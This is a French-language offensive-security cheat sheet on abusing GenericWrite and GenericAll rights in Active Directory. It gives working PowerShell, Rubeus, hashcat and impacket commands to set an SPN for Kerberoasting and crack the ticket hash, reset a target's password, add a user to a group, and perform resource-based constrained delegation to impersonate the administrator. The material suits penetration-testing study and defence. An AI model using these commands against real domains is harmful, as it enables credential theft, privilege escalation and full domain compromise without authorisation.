### 📝 Ajout d'un SPN pour Kerberoasting

Si notre utilisateur a les droits `GenericWrite` ou `GenericAll` sur un objet de l'AD, il est possible de mettre un SPN sur cet objet, ce qui le rend par la suite kerberoastable.

Énumération des droits de notre utilisateur :

```powershell
Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match "notreUser"}
```

Mise en place d'un SPN sur l'utilisateur cible :

```powershell
Set-DomainObject -Identity UtilisateurCible -Set @{serviceprincipalname='us/hackedBro'}
---
Set-ADUser -Identity UtilisateurCible -ServicePrincipalNames @{add='us/hackedBro'}
```

[Kerberoasting](../Kerberoasting.md) de l'utilisateur :

```powershell
Rubeus.exe kerberoast /outfile:target.txt
```

Cracking du hash :

```bash
hashcat '$tgs' /ush/share/wordlist/rockyou.txt
```

#### Changement direct de mot de passe avec `GenericAll`

Avec le droit `GenericAll`, il est possible de changer directement le mot de passe de l'objet sur lequel le droit s'applique, mais cette action est beaucoup moins "safe" que d'ajouter un SPN :

```powershell
net user userCible password /domain
```

#### Ajout à un groupe avec `GenericAll`

Si le droit `GenericAll` s'applique sur un groupe, il est possible de s'ajouter dans ce groupe :

```powershell
net group "groupe" user /add /domain
```

---
### 📝 GenericWrite sur un compte machine

Ce droit permet d'abuser de la Resource-Based Constrained Delegation (RBCD).
#### 🍔 Depuis Windows

Pour exploiter ce droit, nous avons besoin des scripts `powermad.ps1` et `[PowerView](../../../Cheatsheets/Tools/PowerView.md)`.

Création d'un compte machine :

```powershell
import-module powermad
New-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose
```

Vérification de la création du compte :

```powershell
Get-DomainComputer
```

Écriture de la propriété `msds-allowedtoactonbehalfofotheridentity` sur le compte machine cible :

```powershell
$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Récupération du hash du compte machine créé :

```
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :

```powershell
rubeus.exe s4u /user:paked$ /aes256:<aes256> /aes128:<aes128> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible
```

#### 🐧 Depuis Linux

Création d'un compte machine :

```bash
impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\$user:$password'
```

Écriture de la propriété `msds-allowedtoactonbehalfofotheridentity` sur le compte machine cible :

```bash
impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'
```

Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :

```bash
impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'
```
